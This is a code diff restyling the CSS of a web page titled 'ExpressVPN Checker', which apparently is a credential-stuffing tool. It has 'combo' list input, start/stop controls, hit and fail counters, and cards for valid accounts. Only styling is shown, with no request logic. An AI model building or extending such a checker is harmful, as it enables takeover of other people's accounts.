@@ -6,358 +6,1205 @@
 <meta name="theme-color" content="#0a0f1e" />
 <title>ExpressVPN Checker | By @SHAKIB2016</title>
 <style>
+  /* ============================================================
+     RESET & BASE
+  ============================================================ */
   * { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg-1: #050816;
+    --bg-2: #0a0f1e;
+    --bg-3: #101a30;
+    --card: rgba(18, 25, 45, 0.7);
+    --card-solid: #0f172a;
+    --border: rgba(56, 189, 248, 0.15);
+    --border-2: rgba(56, 189, 248, 0.28);
+    --text: #eef2ff;
+    --text-dim: #94a3b8;
+    --text-dimmer: #64748b;
+    --primary: #3b82f6;
+    --primary-2: #8b5cf6;
+    --success: #22c55e;
+    --danger: #ef4444;
+    --warning: #facc15;
+    --radius-lg: 20px;
+    --radius-md: 14px;
+    --radius-sm: 10px;
+  }
   html, body {
-    background: linear-gradient(160deg, #0a0f1e 0%, #0c1222 60%, #101a30 100%);
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Inter, system-ui, sans-serif;
-    color: #eef2ff;
+    background: var(--bg-1);
+    background-image:
+      radial-gradient(circle at 15% 5%, rgba(139, 92, 246, 0.18) 0%, transparent 40%),
+      radial-gradient(circle at 85% 95%, rgba(56, 189, 248, 0.16) 0%, transparent 45%),
+      radial-gradient(circle at 50% 50%, rgba(59, 130, 246, 0.06) 0%, transparent 60%),
+      linear-gradient(160deg, #050816 0%, #0a0f1e 55%, #0f1830 100%);
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+    color: var(--text);
     min-height: 100vh;
     height: 100vh;
     overflow: hidden;
     -webkit-tap-highlight-color: transparent;
+    -webkit-font-smoothing: antialiased;
   }
 
-  .wrap {
-    max-width: 1200px;
-    margin: 0 auto;
-    padding: 12px 14px;
-    height: 100vh;
+  /* Custom scrollbar */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: rgba(15, 23, 42, 0.4); border-radius: 10px; }
+  ::-webkit-scrollbar-thumb {
+    background: linear-gradient(180deg, #38bdf8, #8b5cf6);
+    border-radius: 10px;
+  }
+
+  /* ============================================================
+     LOGIN PAGE
+  ============================================================ */
+  #loginPage {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+    position: relative;
+    overflow: hidden;
+  }
+  #loginPage::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(circle at 30% 20%, rgba(139, 92, 246, 0.25), transparent 50%),
+      radial-gradient(circle at 70% 80%, rgba(56, 189, 248, 0.2), transparent 50%);
+    animation: pulse-bg 8s ease-in-out infinite;
+    z-index: 0;
+  }
+  @keyframes pulse-bg {
+    0%, 100% { opacity: 0.6; transform: scale(1); }
+    50% { opacity: 1; transform: scale(1.15); }
+  }
+
+  .login-shell {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 420px;
     display: flex;
     flex-direction: column;
-    gap: 12px;
+    gap: 24px;
   }
-
-  /* ===== Header ===== */
-  header {
+  .login-brand {
     text-align: center;
-    padding: 14px 12px;
-    background: rgba(18, 25, 45, 0.75);
-    border-radius: 18px;
-    border: 1px solid rgba(56, 189, 248, 0.18);
-    flex-shrink: 0;
   }
-  header h1 {
-    font-size: 1.35rem;
+  .login-brand .logo-mark {
+    width: 76px;
+    height: 76px;
+    margin: 0 auto 16px;
+    border-radius: 22px;
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 2rem;
+    box-shadow:
+      0 12px 32px rgba(59, 130, 246, 0.4),
+      inset 0 1px 0 rgba(255, 255, 255, 0.2);
+    animation: float 4s ease-in-out infinite;
+  }
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-6px); }
+  }
+  .login-brand h1 {
+    font-size: 1.6rem;
     background: linear-gradient(135deg, #c084fc, #38bdf8);
     -webkit-background-clip: text;
     background-clip: text;
     color: transparent;
     font-weight: 800;
-    letter-spacing: -0.4px;
+    letter-spacing: -0.5px;
   }
-  header p { margin-top: 4px; font-size: 0.72rem; color: #9ca3af; }
-  header p a { color: #38bdf8; text-decoration: none; font-weight: 600; }
+  .login-brand p {
+    margin-top: 6px;
+    font-size: 0.82rem;
+    color: var(--text-dim);
+  }
+  .login-brand p a { color: #38bdf8; text-decoration: none; font-weight: 600; }
 
-  /* ===== Login ===== */
-  .login-box {
-    max-width: 400px;
-    margin: 40px auto;
-    background: rgba(18, 25, 45, 0.85);
-    padding: 28px 22px;
-    border-radius: 20px;
-    border: 1px solid rgba(56, 189, 248, 0.2);
-    box-shadow: 0 10px 32px rgba(0, 0, 0, 0.4);
+  .login-card {
+    background: rgba(18, 25, 45, 0.72);
+    backdrop-filter: blur(24px);
+    -webkit-backdrop-filter: blur(24px);
+    border: 1px solid var(--border-2);
+    border-radius: 24px;
+    padding: 28px 24px;
+    box-shadow:
+      0 24px 48px rgba(0, 0, 0, 0.5),
+      inset 0 1px 0 rgba(255, 255, 255, 0.05);
   }
-  .login-box h2 { text-align: center; margin-bottom: 20px; font-size: 1.1rem; }
-  .field { margin-bottom: 14px; }
-  .field label { font-size: 0.76rem; color: #cbd5e1; display: block; margin-bottom: 5px; }
+  .login-card h2 {
+    font-size: 1.05rem;
+    font-weight: 700;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    color: #cbd5e1;
+  }
+
+  .field { margin-bottom: 16px; }
+  .field label {
+    display: block;
+    font-size: 0.75rem;
+    color: var(--text-dim);
+    margin-bottom: 7px;
+    font-weight: 600;
+    letter-spacing: 0.4px;
+    text-transform: uppercase;
+  }
+  .field .input-wrap {
+    position: relative;
+  }
+  .field .input-wrap .icon {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 1rem;
+    opacity: 0.6;
+    pointer-events: none;
+  }
   .field input {
     width: 100%;
-    background: rgba(15, 23, 42, 0.9);
-    border: 1px solid #2d3a5e;
-    border-radius: 10px;
-    padding: 11px 12px;
+    background: rgba(2, 6, 23, 0.6);
+    border: 1px solid #334155;
+    border-radius: 12px;
+    padding: 13px 14px 13px 42px;
     color: #e2e8f0;
-    font-size: 0.9rem;
-  }
-  .field input:focus { outline: none; border-color: #3b82f6; }
-  .btn-main {
-    width: 100%;
-    padding: 12px;
-    background: linear-gradient(95deg, #3b82f6, #8b5cf6);
-    border: none;
-    border-radius: 12px;
-    color: white;
-    font-weight: 700;
-    font-size: 0.9rem;
-    cursor: pointer;
-    margin-top: 6px;
-  }
-  .btn-main:disabled { opacity: 0.6; }
-
-  /* ===== User bar ===== */
-  .userbar {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    background: rgba(15, 23, 42, 0.85);
-    padding: 8px 14px;
-    border-radius: 12px;
-    border: 1px solid #1e293b;
-    font-size: 0.78rem;
-    flex-shrink: 0;
-  }
-  .userbar .who b { color: #38bdf8; }
-  .userbar .logout {
-    background: #334155;
-    border: none;
-    color: white;
-    padding: 5px 12px;
-    border-radius: 20px;
-    font-size: 0.7rem;
-    cursor: pointer;
-  }
-
-  /* ===== Tabs ===== */
-  .tabs {
-    display: flex;
-    gap: 5px;
-    background: rgba(18, 25, 45, 0.75);
-    padding: 5px;
-    border-radius: 14px;
-    border: 1px solid rgba(56, 189, 248, 0.15);
-    overflow-x: auto;
-    scrollbar-width: none;
-    flex-shrink: 0;
-  }
-  .tabs::-webkit-scrollbar { display: none; }
-  .tab {
-    flex: 1;
-    min-width: 82px;
-    text-align: center;
-    padding: 9px 6px;
-    border-radius: 10px;
-    background: transparent;
-    color: #cbd5e1;
-    font-size: 0.74rem;
-    font-weight: 600;
-    cursor: pointer;
-    border: none;
-    white-space: nowrap;
+    font-size: 0.92rem;
+    font-family: inherit;
     transition: all 0.2s;
   }
-  .tab.active {
-    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-    color: white;
-    box-shadow: 0 4px 12px rgba(59, 130, 246, 0.35);
+  .field input:focus {
+    outline: none;
+    border-color: var(--primary);
+    background: rgba(2, 6, 23, 0.85);
+    box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
   }
-  .tab .badge {
-    display: inline-block;
-    background: rgba(255, 255, 255, 0.22);
-    padding: 1px 7px;
-    border-radius: 20px;
-    font-size: 0.65rem;
-    margin-left: 3px;
+  .field input::placeholder { color: #475569; }
+
+  .btn-primary {
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    border: none;
+    border-radius: 14px;
+    color: white;
+    font-weight: 700;
+    font-size: 0.94rem;
+    cursor: pointer;
+    transition: all 0.25s;
+    box-shadow: 0 8px 24px rgba(59, 130, 246, 0.35);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn-primary::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
+    transition: 0.5s;
+  }
+  .btn-primary:hover::before { left: 100%; }
+  .btn-primary:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 32px rgba(59, 130, 246, 0.45);
+  }
+  .btn-primary:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
   }
 
-  /* ===== Panel container – flex-based, scrollable body ===== */
-  .panel-container {
-    flex: 1;
-    min-height: 0;             /* important for flex child to shrink */
+  .login-hint {
+    text-align: center;
+    font-size: 0.72rem;
+    color: var(--text-dimmer);
+    margin-top: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+  }
+
+  /* ============================================================
+     APP SHELL
+  ============================================================ */
+  #appPage {
+    display: none;
+    height: 100vh;
+    overflow: hidden;
+  }
+
+  .app-layout {
+    display: flex;
+    height: 100vh;
+    flex-direction: column;
+  }
+
+  /* ===== Top Header (both mobile & PC) ===== */
+  .topbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 16px;
+    background: rgba(10, 15, 30, 0.85);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+    z-index: 50;
+  }
+  .topbar .brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .topbar .brand .logo-mark {
+    width: 36px;
+    height: 36px;
+    border-radius: 11px;
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.1rem;
+    box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
+  }
+  .topbar .brand .title {
     display: flex;
     flex-direction: column;
   }
-  .panel {
-    display: none;
-    background: rgba(18, 25, 45, 0.75);
-    border-radius: 18px;
-    border: 1px solid rgba(56, 189, 248, 0.15);
-    padding: 14px;
-    flex: 1;
-    min-height: 0;
-    flex-direction: column;
-    overflow: hidden;
+  .topbar .brand .title h1 {
+    font-size: 0.95rem;
+    font-weight: 800;
+    background: linear-gradient(135deg, #c084fc, #38bdf8);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    letter-spacing: -0.3px;
+    line-height: 1.2;
   }
-  .panel.active { display: flex; }
-  .panel .scroll-area {
-    flex: 1;
-    min-height: 0;
-    overflow-y: auto;
-    padding-right: 4px;
+  .topbar .brand .title small {
+    font-size: 0.66rem;
+    color: var(--text-dimmer);
+    margin-top: 1px;
   }
-  .panel .scroll-area::-webkit-scrollbar { width: 6px; }
-  .panel .scroll-area::-webkit-scrollbar-track { background: rgba(15, 23, 42, 0.5); border-radius: 10px; }
-  .panel .scroll-area::-webkit-scrollbar-thumb {
-    background: linear-gradient(180deg, #38bdf8, #818cf8);
-    border-radius: 10px;
-  }
+  .topbar .brand .title small a { color: #38bdf8; text-decoration: none; }
 
-  /* ===== Form ===== */
-  label { display: block; font-size: 0.82rem; color: #cbd5e1; margin-bottom: 6px; font-weight: 600; }
-  textarea {
-    width: 100%;
-    min-height: 130px;
-    max-height: 260px;
-    background: rgba(15, 23, 42, 0.9);
-    border: 1px solid #2d3a5e;
-    border-radius: 14px;
-    padding: 11px;
-    color: #e2e8f0;
-    font-family: 'SF Mono', Consolas, monospace;
-    font-size: 0.78rem;
-    resize: vertical;
+  .topbar .user-zone {
+    display: flex;
+    align-items: center;
+    gap: 10px;
   }
-  textarea:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15); }
-
-  .file-row { display: flex; flex-wrap: wrap; gap: 8px; margin: 8px 0 10px; }
-  .file-label {
-    background: #1e293b;
-    border: 1px dashed #475569;
-    padding: 8px 14px;
+  .user-chip {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(15, 23, 42, 0.8);
+    border: 1px solid var(--border);
+    padding: 6px 12px 6px 6px;
     border-radius: 30px;
     font-size: 0.76rem;
     color: #cbd5e1;
-    cursor: pointer;
-    transition: 0.2s;
   }
-  .file-label:hover { background: #334155; border-color: #38bdf8; }
-  .file-label input { display: none; }
-
-  .btn-row { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
-  button {
-    background: linear-gradient(95deg, #3b82f6, #2563eb);
-    border: none;
-    font-weight: 700;
-    padding: 10px 18px;
-    border-radius: 30px;
+  .user-chip .avatar {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.72rem;
+    font-weight: 800;
     color: white;
+  }
+  .user-chip b { color: #e2e8f0; font-weight: 700; }
+
+  .icon-btn {
+    background: rgba(15, 23, 42, 0.8);
+    border: 1px solid var(--border);
+    color: #cbd5e1;
+    width: 36px;
+    height: 36px;
+    border-radius: 11px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
     cursor: pointer;
-    font-size: 0.82rem;
+    transition: all 0.2s;
+    font-size: 0.9rem;
+  }
+  .icon-btn:hover {
+    background: rgba(56, 189, 248, 0.12);
+    border-color: var(--border-2);
+    color: #38bdf8;
+  }
+
+  /* ============================================================
+     MOBILE-FIRST BODY
+  ============================================================ */
+  .app-body {
     flex: 1;
-    min-width: 100px;
-    transition: 0.2s;
+    min-height: 0;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
   }
-  button:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 6px 16px rgba(59, 130, 246, 0.3); }
-  button:disabled { opacity: 0.5; cursor: not-allowed; }
-  button.stop { background: linear-gradient(95deg, #ef4444, #b91c1c); }
-  button.ghost { background: #334155; }
-  button.green { background: linear-gradient(95deg, #22c55e, #16a34a); }
 
-  /* ===== Stats ===== */
-  .stats {
-    display: grid;
-    grid-template-columns: repeat(4, 1fr);
-    gap: 8px;
-    margin-top: 12px;
+  /* ===== Sidebar (desktop) – hidden on mobile ===== */
+  .sidebar {
+    display: none;
+  }
+
+  /* ===== Main content ===== */
+  .main-content {
+    flex: 1;
+    min-height: 0;
+    display: flex;
+    flex-direction: column;
+    padding: 12px;
+    gap: 12px;
+    overflow: hidden;
+  }
+
+  /* ===== Mobile bottom nav ===== */
+  .bottom-nav {
+    display: flex;
+    background: rgba(10, 15, 30, 0.95);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border-top: 1px solid var(--border);
+    padding: 6px 4px calc(6px + env(safe-area-inset-bottom));
     flex-shrink: 0;
+    z-index: 40;
   }
-  .stat {
-    background: rgba(15, 23, 42, 0.9);
+  .bottom-nav .nav-item {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 3px;
+    padding: 8px 4px;
     border-radius: 12px;
-    padding: 10px 6px;
-    text-align: center;
-    border: 1px solid #1e293b;
-    border-left: 3px solid #38bdf8;
+    background: transparent;
+    border: none;
+    color: #64748b;
+    font-size: 0.65rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.25s;
+    position: relative;
   }
-  .stat .num { font-size: 1.25rem; font-weight: 800; }
-  .stat .label { font-size: 0.64rem; color: #94a3b8; margin-top: 2px; letter-spacing: 0.3px; }
-  .stat.hit { border-left-color: #4ade80; } .stat.hit .num { color: #4ade80; }
-  .stat.fail { border-left-color: #f87171; } .stat.fail .num { color: #f87171; }
+  .bottom-nav .nav-item .ni {
+    font-size: 1.15rem;
+    line-height: 1;
+    transition: transform 0.25s;
+  }
+  .bottom-nav .nav-item.active {
+    color: #38bdf8;
+  }
+  .bottom-nav .nav-item.active .ni {
+    transform: translateY(-1px) scale(1.1);
+    filter: drop-shadow(0 4px 12px rgba(56, 189, 248, 0.6));
+  }
+  .bottom-nav .nav-item.active::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 24px;
+    height: 3px;
+    background: linear-gradient(90deg, #38bdf8, #8b5cf6);
+    border-radius: 0 0 4px 4px;
+  }
+  .bottom-nav .nav-item .badge {
+    position: absolute;
+    top: 2px;
+    right: 50%;
+    transform: translateX(22px);
+    background: linear-gradient(135deg, #ef4444, #b91c1c);
+    color: white;
+    font-size: 0.6rem;
+    font-weight: 800;
+    min-width: 17px;
+    height: 17px;
+    padding: 0 4px;
+    border-radius: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 2px solid #0a0f1e;
+    box-shadow: 0 2px 6px rgba(239, 68, 68, 0.5);
+    line-height: 1;
+  }
 
-  .progress { height: 8px; background: #1e293b; border-radius: 20px; overflow: hidden; margin-top: 12px; flex-shrink: 0; }
+  /* ===== Panels ===== */
+  .panel-wrap {
+    flex: 1;
+    min-height: 0;
+    position: relative;
+  }
+  .panel {
+    position: absolute;
+    inset: 0;
+    display: none;
+    flex-direction: column;
+    background: rgba(18, 25, 45, 0.55);
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    overflow: hidden;
+    animation: panelIn 0.3s ease;
+  }
+  @keyframes panelIn {
+    from { opacity: 0; transform: translateY(8px) scale(0.99); }
+    to { opacity: 1; transform: none; }
+  }
+  .panel.active { display: flex; }
+
+  .panel-scroll {
+    flex: 1;
+    min-height: 0;
+    overflow-y: auto;
+    padding: 16px;
+  }
+
+  /* ============================================================
+     COMBO PANEL
+  ============================================================ */
+  .section-title {
+    font-size: 0.8rem;
+    font-weight: 700;
+    color: #cbd5e1;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 10px;
+    letter-spacing: 0.3px;
+  }
+  .section-title .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #38bdf8, #8b5cf6);
+    box-shadow: 0 0 8px rgba(56, 189, 248, 0.7);
+  }
+
+  .combo-field { margin-bottom: 14px; }
+  textarea {
+    width: 100%;
+    min-height: 150px;
+    max-height: 320px;
+    background: rgba(2, 6, 23, 0.6);
+    border: 1px solid #334155;
+    border-radius: 14px;
+    padding: 14px;
+    color: #e2e8f0;
+    font-family: 'SF Mono', 'JetBrains Mono', Consolas, monospace;
+    font-size: 0.8rem;
+    line-height: 1.5;
+    resize: vertical;
+    transition: all 0.2s;
+  }
+  textarea:focus {
+    outline: none;
+    border-color: var(--primary);
+    box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
+    background: rgba(2, 6, 23, 0.85);
+  }
+  textarea::placeholder { color: #475569; }
+
+  .upload-row {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin-bottom: 14px;
+  }
+  .upload-btn {
+    flex: 1;
+    min-width: 130px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 11px 14px;
+    background: rgba(15, 23, 42, 0.7);
+    border: 1.5px dashed #475569;
+    border-radius: 12px;
+    color: #cbd5e1;
+    font-size: 0.78rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: inherit;
+  }
+  .upload-btn:hover {
+    background: rgba(56, 189, 248, 0.08);
+    border-color: #38bdf8;
+    color: #38bdf8;
+    transform: translateY(-1px);
+  }
+  .upload-btn input { display: none; }
+  .upload-btn.danger:hover {
+    background: rgba(239, 68, 68, 0.08);
+    border-color: #ef4444;
+    color: #ef4444;
+  }
+
+  .action-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+  }
+  .action-row.single { grid-template-columns: 1fr; }
+
+  .btn {
+    padding: 13px 16px;
+    border: none;
+    border-radius: 13px;
+    color: white;
+    font-weight: 700;
+    font-size: 0.85rem;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    transition: all 0.25s;
+    font-family: inherit;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn:hover:not(:disabled) {
+    transform: translateY(-2px);
+  }
+  .btn:disabled {
+    opacity: 0.45;
+    cursor: not-allowed;
+  }
+  .btn.start {
+    background: linear-gradient(135deg, #22c55e, #16a34a);
+    box-shadow: 0 6px 20px rgba(34, 197, 94, 0.35);
+  }
+  .btn.start:hover:not(:disabled) {
+    box-shadow: 0 10px 28px rgba(34, 197, 94, 0.45);
+  }
+  .btn.stop {
+    background: linear-gradient(135deg, #ef4444, #b91c1c);
+    box-shadow: 0 6px 20px rgba(239, 68, 68, 0.35);
+  }
+  .btn.stop:hover:not(:disabled) {
+    box-shadow: 0 10px 28px rgba(239, 68, 68, 0.45);
+  }
+  .btn.export {
+    background: rgba(15, 23, 42, 0.85);
+    border: 1px solid #334155;
+    color: #cbd5e1;
+    box-shadow: none;
+  }
+  .btn.export:hover {
+    border-color: var(--border-2);
+    background: rgba(56, 189, 248, 0.1);
+    color: #38bdf8;
+  }
+
+  /* ===== Stats Grid ===== */
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 10px;
+    margin-top: 16px;
+  }
+  .stat-card {
+    background: rgba(2, 6, 23, 0.55);
+    border: 1px solid #1e293b;
+    border-radius: 14px;
+    padding: 12px;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.25s;
+  }
+  .stat-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 3px;
+    height: 100%;
+    background: linear-gradient(180deg, #38bdf8, #8b5cf6);
+  }
+  .stat-card.hit::before { background: linear-gradient(180deg, #22c55e, #16a34a); }
+  .stat-card.fail::before { background: linear-gradient(180deg, #ef4444, #b91c1c); }
+  .stat-card .ico-row {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 0.68rem;
+    color: #94a3b8;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.4px;
+  }
+  .stat-card .value {
+    font-size: 1.6rem;
+    font-weight: 800;
+    color: #e2e8f0;
+    line-height: 1;
+    margin-top: 4px;
+    font-variant-numeric: tabular-nums;
+    letter-spacing: -0.5px;
+  }
+  .stat-card.hit .value { color: #4ade80; }
+  .stat-card.fail .value { color: #f87171; }
+
+  /* ===== Progress ===== */
+  .progress-wrap {
+    margin-top: 16px;
+    background: rgba(2, 6, 23, 0.5);
+    border: 1px solid #1e293b;
+    border-radius: 14px;
+    padding: 12px 14px;
+  }
+  .progress-head {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.72rem;
+    color: #94a3b8;
+    margin-bottom: 8px;
+    font-weight: 600;
+  }
+  .progress-head b { color: #38bdf8; }
+  .progress-bar {
+    height: 8px;
+    background: rgba(30, 41, 59, 0.8);
+    border-radius: 30px;
+    overflow: hidden;
+    position: relative;
+  }
   .progress-fill {
     height: 100%;
     width: 0%;
-    background: linear-gradient(90deg, #38bdf8, #818cf8);
-    transition: width 0.3s;
+    background: linear-gradient(90deg, #38bdf8, #8b5cf6, #38bdf8);
+    background-size: 200% 100%;
+    border-radius: 30px;
+    transition: width 0.4s ease;
+    animation: progress-shine 2s linear infinite;
   }
-  #status { margin-top: 8px; font-size: 0.74rem; color: #94a3b8; text-align: center; min-height: 16px; flex-shrink: 0; }
-
-  /* ===== Hit cards – scroll area handles scroll ===== */
-  .hit-list { display: flex; flex-direction: column; gap: 12px; }
-  .hit-card {
-    background: linear-gradient(135deg, rgba(15, 42, 31, 0.85), rgba(15, 23, 42, 0.9));
-    border: 1px solid rgba(74, 222, 128, 0.35);
-    border-left: 4px solid #4ade80;
-    border-radius: 14px;
-    padding: 13px;
-    position: relative;
+  @keyframes progress-shine {
+    from { background-position: 0% 50%; }
+    to { background-position: 200% 50%; }
+  }
+  .status-text {
+    margin-top: 10px;
+    font-size: 0.74rem;
+    color: var(--text-dim);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    min-height: 16px;
+  }
+  .status-text .pulse-dot {
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: #22c55e;
+    box-shadow: 0 0 8px rgba(34, 197, 94, 0.8);
+    animation: pulse-dot 1.5s ease-in-out infinite;
     flex-shrink: 0;
   }
-  .hit-card .badge-hit {
+  @keyframes pulse-dot {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.3); opacity: 0.6; }
+  }
+
+  /* ============================================================
+     HIT CARDS
+  ============================================================ */
+  .hits-list { display: flex; flex-direction: column; gap: 12px; }
+  .hit-card {
+    background: linear-gradient(135deg, rgba(15, 42, 31, 0.65), rgba(2, 6, 23, 0.75));
+    border: 1px solid rgba(74, 222, 128, 0.3);
+    border-radius: 16px;
+    padding: 14px;
+    position: relative;
+    overflow: hidden;
+    animation: hitIn 0.4s ease;
+  }
+  @keyframes hitIn {
+    from { opacity: 0; transform: translateY(12px) scale(0.97); }
+    to { opacity: 1; transform: none; }
+  }
+  .hit-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 4px;
+    height: 100%;
+    background: linear-gradient(180deg, #22c55e, #16a34a);
+  }
+  .hit-card::after {
+    content: '';
+    position: absolute;
+    top: -50%;
+    right: -50%;
+    width: 200px;
+    height: 200px;
+    background: radial-gradient(circle, rgba(34, 197, 94, 0.1), transparent 60%);
+    pointer-events: none;
+  }
+  .hit-head {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 8px;
+    margin-bottom: 12px;
+    position: relative;
+    z-index: 1;
+  }
+  .hit-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
     background: linear-gradient(135deg, #22c55e, #16a34a);
     color: white;
-    font-size: 0.65rem;
+    font-size: 0.66rem;
     font-weight: 800;
-    padding: 3px 9px;
+    padding: 5px 11px;
     border-radius: 20px;
+    letter-spacing: 0.5px;
+    box-shadow: 0 4px 12px rgba(34, 197, 94, 0.4);
   }
-  .hit-card .fields { display: flex; flex-direction: column; gap: 5px; margin-top: 9px; }
-  .hit-card .field { display: flex; gap: 8px; font-size: 0.75rem; word-break: break-all; }
-  .hit-card .field .k { color: #94a3b8; min-width: 74px; flex-shrink: 0; }
-  .hit-card .field .v { color: #f1f5f9; font-weight: 600; }
-  .hit-card .field .v.mono {
-    font-family: 'SF Mono', Consolas, monospace;
-    background: rgba(0, 0, 0, 0.28);
-    padding: 1px 6px;
-    border-radius: 6px;
-  }
-  .hit-card .copy-btn {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    background: #1e293b;
+  .copy-btn {
+    background: rgba(15, 23, 42, 0.8);
     border: 1px solid #334155;
-    padding: 4px 10px;
-    border-radius: 20px;
     color: #cbd5e1;
-    font-size: 0.65rem;
+    padding: 6px 12px;
+    border-radius: 20px;
+    font-size: 0.68rem;
+    font-weight: 600;
     cursor: pointer;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    font-family: inherit;
   }
-  .hit-card .copy-btn:hover { background: #334155; }
+  .copy-btn:hover {
+    background: rgba(56, 189, 248, 0.15);
+    border-color: var(--border-2);
+    color: #38bdf8;
+  }
+  .hit-fields { display: flex; flex-direction: column; gap: 8px; position: relative; z-index: 1; }
+  .hit-field {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    font-size: 0.76rem;
+    line-height: 1.4;
+  }
+  .hit-field .fico {
+    flex-shrink: 0;
+    width: 22px;
+    height: 22px;
+    border-radius: 7px;
+    background: rgba(30, 41, 59, 0.8);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.75rem;
+  }
+  .hit-field .fk {
+    color: var(--text-dim);
+    font-size: 0.7rem;
+    min-width: 68px;
+    flex-shrink: 0;
+    padding-top: 2px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+  }
+  .hit-field .fv {
+    color: #f1f5f9;
+    font-weight: 600;
+    word-break: break-all;
+    flex: 1;
+  }
+  .hit-field .fv.mono {
+    font-family: 'SF Mono', Consolas, monospace;
+    background: rgba(2, 6, 23, 0.7);
+    padding: 2px 8px;
+    border-radius: 6px;
+    font-size: 0.72rem;
+    border: 1px solid rgba(56, 189, 248, 0.12);
+  }
+  .hit-field .fv.accent { color: #4ade80; }
 
-  /* ===== Mini list ===== */
-  .mini-list { display: flex; flex-direction: column; gap: 5px; }
+  /* ============================================================
+     MINI LIST (All tab)
+  ============================================================ */
+  .mini-list { display: flex; flex-direction: column; gap: 6px; }
   .mini-item {
     display: flex;
     justify-content: space-between;
-    gap: 8px;
-    padding: 9px 11px;
-    border-radius: 9px;
-    background: rgba(15, 23, 42, 0.85);
+    align-items: center;
+    gap: 10px;
+    padding: 10px 12px;
+    border-radius: 10px;
+    background: rgba(2, 6, 23, 0.5);
+    border: 1px solid #1e293b;
     border-left: 3px solid #334155;
